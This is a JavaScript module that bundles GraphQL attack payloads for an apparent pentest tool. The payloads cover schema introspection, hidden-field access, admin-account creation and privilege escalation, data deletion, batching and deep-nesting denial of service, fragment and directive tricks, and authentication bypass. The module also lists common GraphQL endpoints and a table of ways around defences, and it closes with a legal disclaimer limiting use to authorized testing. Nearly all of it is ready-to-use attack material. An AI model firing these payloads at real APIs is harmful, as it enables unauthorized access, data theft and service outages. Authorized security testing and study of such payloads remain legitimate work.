export const GRAPHQL_INJECTION_CATEGORIES = {
  INTROSPECTION: 'Introspection Queries',
  FIELD_ENUMERATION: 'Field Enumeration',
  MUTATION_ABUSE: 'Mutation Attacks',
  BATCHING_ATTACKS: 'Batching & Aliases',
  FRAGMENT_EXPLOITATION: 'Fragment Attacks',
  DIRECTIVE_INJECTION: 'Directive Injection',
  DOS_ATTACKS: 'DoS Attacks',
  AUTH_BYPASS: 'Authentication Bypass'
};

const payloads = {
  INTROSPECTION: [
    {
      name: 'Full Schema Introspection',
      description: 'Dump entire GraphQL schema to discover types, fields, and mutations',
      payload: `{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
      }
      enumValues {
        name
      }
    }
  }
}`,
      explanation: 'Introspection queries expose the GraphQL schema structure. Developers often disable this in production but it\'s frequently left enabled in development/staging environments.'
    },
    {
      name: 'Query Type Information',
      description: 'Enumerate all available queries',
      payload: `{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}`,
      explanation: 'Lists all query entry points and their arguments. Useful for discovering hidden query functionality.'
    },
    {
      name: 'Mutation Type Enumeration',
      description: 'Discover all mutations and their parameters',
      payload: `{
  __schema {
    mutationType {
      fields {
        name
        description
        args {
          name
          type {
            name
            ofType {
              name
              kind
            }
          }
        }
        type {
          name
        }
      }
    }
  }
}`,
      explanation: 'Shows all available mutations, which operations modify data, and what parameters they accept.'
    },
    {
      name: 'Type Definition Discovery',
      description: 'Get details on specific types',
      payload: `{
  __type(name: "User") {
    name
    kind
    fields {
      name
      type {
        name
        kind
        ofType {
          name
        }
      }
    }
    interfaces {
      name
    }
  }
}`,
      explanation: 'Retrieves detailed information about a specific type. Replace "User" with target type name.'
    }
  ],

  FIELD_ENUMERATION: [
    {
      name: 'Recursive Field Discovery',
      description: 'Discover nested fields through recursive queries',
      payload: `{
  user {
    id
    name
    email
    posts {
      id
      title
      content
      author {
        id
        name
        email
      }
    }
  }
}`,
      explanation: 'Tests query depth to find nested data. May reveal sensitive information in nested fields.'
    },
    {
      name: 'Hidden Field Access',
      description: 'Attempt to access internal or hidden fields',
      payload: `{
  user(id: "1") {
    id
    name
    email
    password
    passwordHash
    internalNotes
    adminNotes
    privacySettings
    __typename
  }
}`,
      explanation: 'GraphQL may expose fields that aren\'t documented in introspection due to misconfiguration.'
    },
    {
      name: 'Alias-Based Field Enumeration',
      description: 'Use aliases to bypass rate limiting and field filtering',
      payload: `{
  user1: user(id: "1") { id name email }
  user2: user(id: "2") { id name email }
  user3: user(id: "3") { id name email }
  user4: user(id: "4") { id name email }
  user5: user(id: "5") { id name email }
}`,
      explanation: 'Multiple aliases in one query bypass per-field rate limits and can extract data from multiple records.'
    },
    {
      name: 'Input Object Fuzzing',
      description: 'Test input validation by sending unexpected field types',
      payload: `{
  user(input: {
    id: "1"
    name: null
    email: ""
    age: -1
    admin: true
    role: "superadmin"
  }) {
    id
    name
    email
  }
}`,
      explanation: 'Attempts to inject unexpected values into input objects to bypass validation or trigger errors.'
    }
  ],

  MUTATION_ABUSE: [
    {
      name: 'Create Admin User',
      description: 'Attempt to create administrative account',
      payload: `mutation {
  createUser(input: {
    email: "attacker@evil.com"
    password: "Password123"
    role: "admin"
    isAdmin: true
  }) {
    id
    email
    role
    isAdmin
  }
}`,
      explanation: 'Tests if authorization checks are enforced on mutation operations. May allow privilege escalation.'
    },
    {
      name: 'Modify User Privileges',
      description: 'Escalate user privileges to admin',
      payload: `mutation {
  updateUser(id: "1" input: {
    role: "admin"
    isAdmin: true
    permissions: ["read", "write", "delete"]
  }) {
    id
    role
    isAdmin
  }
}`,
      explanation: 'Attempts to modify existing user roles without proper authorization checks.'
    },
    {
      name: 'Delete Critical Data',
      description: 'Attempt to delete important data',
      payload: `mutation {
  deleteUser(id: "1") {
    success
    message
  }
  deletePost(id: "100") {
    success
    message
  }
}`,
      explanation: 'Tests if deletion operations properly validate authorization and data ownership.'
    },
    {
      name: 'Batch Mutation Attack',
      description: 'Execute multiple mutations in single request',
      payload: `mutation {
  createPost(input: {title: "Post1" content: "..."}) { id }
  updatePost(id: "1" input: {published: true}) { id }
  deletePost(id: "2") { success }
  createComment(input: {postId: "1" text: "spam"}) { id }
}`,
      explanation: 'Multiple mutations in one request can bypass rate limiting and batch constraints.'
    }
  ],

  BATCHING_ATTACKS: [
    {
      name: 'Query Batching Bomb',
      description: 'Send many queries in single request to cause resource exhaustion',
      payload: `[
  {query: "{user(id:\"1\") {id name}}"},
  {query: "{user(id:\"2\") {id name}}"},
  {query: "{user(id:\"3\") {id name}}"},
  ...repeat 1000 times...
]`,
      explanation: 'GraphQL batch query support allows sending hundreds of queries in one HTTP request, exhausting server resources.'
    },
    {
      name: 'Recursive Alias Query',
      description: 'Create deep recursion through aliases',
      payload: `{
  a: user { friends { friends { friends { friends { id name } } } } }
  b: user { friends { friends { friends { friends { id name } } } } }
  c: user { friends { friends { friends { friends { id name } } } } }
}`,
      explanation: 'Deep recursive queries can cause exponential data fetching and CPU consumption.'
    },
    {
      name: 'Duplicate Query Fields',
      description: 'Request same field multiple times',
      payload: `{
  user {
    name name name name name
    email email email email email
    id id id id id
    profile { bio bio bio bio bio }
  }
}`,
      explanation: 'Duplicate fields force the server to compute the same data multiple times without caching benefits.'
    },
    {
      name: 'Large List Query',
      description: 'Request maximum items without pagination',
      payload: `{
  users(limit: 999999999) {
    id
    name
    email
    posts {
      id
      title
      comments {
        id
        text
        author { id name }
      }
    }
  }
}`,
      explanation: 'Requesting extremely large result sets without pagination causes memory exhaustion.'
    }
  ],

  FRAGMENT_EXPLOITATION: [
    {
      name: 'Fragment Type Confusion',
      description: 'Use fragments to access restricted data',
      payload: `fragment UserData on User {
  id
  name
  email
  internalId
  internalNotes
  ssn
}

query {
  user {
    ...UserData
  }
}`,
      explanation: 'Fragments can sometimes bypass type restrictions or expose fields that are filtered at query level.'
    },
    {
      name: 'Nested Fragment Injection',
      description: 'Deeply nested fragments to confuse resolver logic',
      payload: `fragment Level1 on User {
  id
  ... on Admin {
    adminPanel {
      ...Level2
    }
  }
}

fragment Level2 on AdminPanel {
  users {
    id
    email
    permissions
    roles
  }
}

query {
  me {
    ...Level1
  }
}`,
      explanation: 'Complex nested fragments with inline type narrowing can bypass authorization checks.'
    },
    {
      name: 'Fragment Recursion',
      description: 'Create infinite recursion through fragments',
      payload: `fragment NodeFragment on Node {
  id
  parent {
    ...NodeFragment
  }
}

query {
  rootNode {
    ...NodeFragment
  }
}`,
      explanation: 'Circular fragment references cause infinite loops in query parsing or execution.'
    }
  ],

  DIRECTIVE_INJECTION: [
    {
      name: 'Skip Directive Abuse',
      description: 'Use @skip directive to bypass security checks',
      payload: `query($shouldSkip: Boolean!) {
  user(id: "1") @skip(if: $shouldSkip) {
    id
    name
    email
  }
}

Variables: {"shouldSkip": false}`,
      explanation: 'The @skip/@include directives control field inclusion. Misconfigured servers may apply auth after directive evaluation.'
    },
    {
      name: 'Include Directive Injection',
      description: 'Force inclusion of protected fields',
      payload: `query($shouldInclude: Boolean!) {
  user(id: "1") {
    id
    name
    email
    password @include(if: $shouldInclude)
    apiKey @include(if: $shouldInclude)
  }
}

Variables: {"shouldInclude": true}`,
      explanation: 'Combining directives with variables to conditionally access sensitive fields.'
    },
    {
      name: 'Custom Directive Injection',
      description: 'Inject custom directives if server allows',
      payload: `{
  user(id: "1") @bypassAuth {
    id
    name
    email
    permissions
    role
  }
}`,
      explanation: 'Some servers support custom directives. Injecting non-existent directives may bypass auth or validation.'
    }
  ],

  DOS_ATTACKS: [
    {
      name: 'Query Complexity Attack',
      description: 'Create query with extremely high complexity',
      payload: `{
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    posts {
                      comments {
                        author { posts { comments { author { name } } } }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}`,
      explanation: 'Deep nested queries with exponential complexity consume CPU and memory rapidly.'
    },
    {
      name: 'Cyclic Reference Query',
      description: 'Exploit cyclic object references',
      payload: `{
  user(id: "1") {
    name
    bestFriend {
      name
      bestFriend {
        name
        bestFriend {
          name
          bestFriend { name }
        }
      }
    }
  }
}`,
      explanation: 'Following cyclic relationships in data model causes infinite traversal attempts.'
    },
    {
      name: 'String Repetition Attack',
      description: 'Force massive string generation',
      payload: `{
  user {
    id
    description
    bio
    longText
    content
    comments {
      text text text text text
      author {
        bio bio bio bio bio
      }
    }
  }
}`,
      explanation: 'Requesting large text fields repeatedly and forcing string multiplication in resolvers.'
    }
  ],

  AUTH_BYPASS: [
    {
      name: 'JWT Token Tampering',
      description: 'Modify JWT claims in queries',
      payload: `query {
  user(id: "1" token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...") {
    id
    name
    email
  }
}`,
      explanation: 'Some APIs accept token as query parameter. May allow token injection or tampering.'
    },
    {
      name: 'Role Elevation in Query',
      description: 'Claim higher privileges in GraphQL variables',
      payload: `query($role: String!) {
  currentUser(role: $role) {
    id
    name
    email
    adminPanel {
      users { id email role }
    }
  }
}

Variables: {"role": "admin"}`,
      explanation: 'GraphQL variables intended for data may control authorization if server is misconfigured.'
    },
    {
      name: 'Empty/Null Context Bypass',
      description: 'Query with missing or null authentication context',
      payload: `query {
  admin {
    sensitiveData
  }
  publicUser: user(id: null) {
    id
    name
  }
}`,
      explanation: 'Null or missing context values may bypass authentication checks if not properly validated.'
    },
    {
      name: 'Field-Level Authorization Bypass',
      description: 'Request protected fields directly',
      payload: `{
  user(id: "1") {
    id
    name
    email
    password
    apiKey
    secretToken
    internalUserId
    databaseId
  }
}`,
      explanation: 'If only object-level auth exists, individual sensitive fields may be accessible.'
    }
  ]
};

export function getAllCategories() {
  return Object.entries(GRAPHQL_INJECTION_CATEGORIES).map(([key, label]) => ({
    key,
    label
  }));
}

export function getPayloadsByCategory(categoryKey) {
  const categoryPayloads = payloads[categoryKey];
  return categoryPayloads || [];
}

export function getAllPayloads() {
  const allPayloads = [];
  Object.keys(payloads).forEach(category => {
    allPayloads.push(...payloads[category]);
  });
  return allPayloads;
}

export function searchPayloads(query) {
  const lowerQuery = query.toLowerCase();
  return getAllPayloads().filter(
    payload =>
      payload.name.toLowerCase().includes(lowerQuery) ||
      payload.description.toLowerCase().includes(lowerQuery) ||
      payload.payload.toLowerCase().includes(lowerQuery)
  );
}

export const GRAPHQL_ENDPOINTS = [
  { name: 'Standard GraphQL', path: '/graphql' },
  { name: 'Apollo GraphQL', path: '/apollo/graphql' },
  { name: 'GraphQL API v1', path: '/api/graphql' },
  { name: 'GraphQL Voyager', path: '/voyager' },
  { name: 'GraphQL Playground', path: '/playground' },
  { name: 'GraphiQL', path: '/graphiql' }
];

export const GRAPHQL_DEFENSE_BYPASS = [
  { technique: 'Introspection Filtering', bypass: 'Use __typename fields or schema extraction through queries' },
  { technique: 'Query Complexity Analysis', bypass: 'Use deeply nested fragments or aliases to exceed complexity budgets gradually' },
  { technique: 'Depth Limiting', bypass: 'Bypass through wide queries with many aliases instead of deep queries' },
  { technique: 'Rate Limiting', bypass: 'Use batch queries or multiple aliases to hit multiple resources in one request' },
  { technique: 'Field Whitelisting', bypass: 'Try accessing fields through different types or aliases' }
];

export const LEGAL_DISCLAIMER = `
⚠️  LEGAL DISCLAIMER
═════════════════════════════════════════════════════════════════════════════

This GraphQL Injection generator is provided for EDUCATIONAL AND AUTHORIZED
SECURITY TESTING PURPOSES ONLY.

🚨 ILLEGAL USES:
• Unauthorized testing on systems you don't own or have written permission to test
• Extracting, stealing, or exfiltrating data without authorization
• Denial of Service (DoS) attacks on production systems
• Bypassing security controls to gain unauthorized access
• Using this tool for malicious purposes or financial gain

⚖️  CONSEQUENCES:
• Criminal prosecution under computer fraud laws (CFAA in US, similar laws internationally)
• Civil liability for damages to systems and data
• Imprisonment up to 10 years and substantial fines ($250,000+)
• Permanent criminal record affecting employment and reputation
• Company liability if used on business systems without authorization

✅ LEGAL USES:
• Authorized penetration testing with written documented permission
• Security research on systems you own or control
• Educational learning in authorized lab environments
• Bug bounty programs with proper scope and authorization
• Responsible vulnerability disclosure through official channels

By using this tool, you acknowledge:
1. You have explicit written authorization to test any systems
2. You understand the legal and criminal consequences of unauthorized access
3. You will not use this for DoS attacks or resource exhaustion
4. You will follow responsible disclosure practices
5. You are solely responsible for any illegal use

GraphQL testing is subject to same laws as Web Application testing.
Unauthorized access is a federal crime regardless of intent.

Always verify written authorization before conducting ANY security testing.
`;
